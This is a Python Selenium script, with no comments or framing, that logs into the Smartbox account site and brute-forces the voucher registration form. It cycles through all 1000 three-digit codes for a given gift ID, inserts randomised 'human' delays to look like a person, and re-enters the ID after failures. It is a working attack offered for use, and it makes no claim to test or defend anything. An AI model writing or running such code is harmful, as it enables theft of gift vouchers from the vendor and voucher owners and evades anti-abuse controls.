from settings import *

service = Service(executable_path="chromedriver.exe")
driver = webdriver.Chrome(service=service)

driver.get("https://myaccount.smartbox.com/fr/account/voucher/register")

time.sleep(2)
try:
    cookies = driver.find_element(By.XPATH, '//*[@id="onetrust-accept-btn-handler"]')
    cookies.click()
except:
    print("Cookies error")

try:
    email = driver.find_element(By.XPATH, '//*[@id="test-form"]/div[1]/input')
    email.click()
    email.clear()
    email.send_keys(str(input("Enter email:   ")))
except:
    print("Mail error")

human_delay(2)
try:
    pwd = driver.find_element(By.XPATH, '//*[@id="test-form"]/div[2]/div/input')
    pwd.click()
    pwd.send_keys(str(input("Enter password:   ")))
except:
    print("Password error")

human_delay(2)
try:
    button = driver.find_element(By.XPATH, '//*[@id="test-form"]/div[3]/button')
    button.click()
except:
    print("Signing button error")

human_delay(2)
try:
    id = driver.find_element(By.XPATH, '//*[@id="account-voucher-register"]/div[1]/div[1]/div/div[1]/div[1]/div[1]/div/div[1]/input')
    id.click()
    num = int(input("Enter gift ID:   "))
    id.send_keys(num)
except:
    print("ID error")



for n in range(1000):
    human_delay()
    try:
        code = driver.find_element(By.XPATH, '//*[@id="account-voucher-register"]/div[1]/div[1]/div/div[2]/div[1]/div[1]/div/div[1]/input')
        code.click()
        if n<10:
            code.send_keys(f"00{n}")
        elif 10<=n<100:
            code.send_keys(f"0{n}")
        else:
            code.send_keys(str(n))
    except:
        print("2nd password error")
    
    try:
        human_delay(2)
        enter = driver.find_element(By.XPATH, '//*[@id="account-voucher-register"]/div[1]/div[2]/button')
        enter.click()

        human_delay(2)
        try:
            go_back = driver.find_element(By.XPATH, '//*[@id="app"]/div/div/section/div/div/div/div[2]/div/div[3]/div/div/div/div/div[2]/div[3]/div/button')
            go_back.click()
        except:
            n -= 1
            refresh = driver.find_element(By.XPATH, '//*[@id="app"]/div/div/section/div/div/div/div[2]/div/div[5]/div/div/div/div/div[2]/div[3]/button')
            refresh.click()
            
            human_delay()
            id = driver.find_element(By.XPATH, '//*[@id="account-voucher-register"]/div[1]/div[1]/div/div[1]/div[1]/div[1]/div/div[1]/input')
            id.click()
            id.send_keys(num)

    except:
        print("Validation error")

time.sleep(20)